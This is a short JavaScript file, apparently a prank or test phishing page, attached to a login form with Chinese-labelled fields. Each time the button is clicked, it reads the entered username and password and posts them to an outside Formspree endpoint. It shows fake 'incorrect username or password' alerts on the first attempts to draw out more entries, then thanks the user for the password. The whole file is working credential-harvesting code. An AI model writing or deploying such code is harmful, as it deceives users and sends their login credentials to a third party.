let time = 0;
async function tstFunction(){
    if(time <= 1){
        time++;
        alert("Either your username is incorrect, or your password is incorrect.")
    }else{
        window.open("WechatIMG15.jpeg", "_blank", "width=600,height=400");
        alert("Thank you for your pasword");
    }
    let data = new FormData();
    data.append("测试","测试用户名输入:"+ document.getElementById("测试用户名输入").value + "\n" 
    + "测试密码输入:" + document.getElementById("测试密码输入").value);
    let response = await fetch("https://formspree.io/f/xeolvpzn", {
      method: "POST",
      body: data,
      headers: { 'Accept': 'application/json' }
    });
    if(response.ok == true){
        console.log("成功");
    }
}

document.getElementById("测试按钮").addEventListener("click",tstFunction);

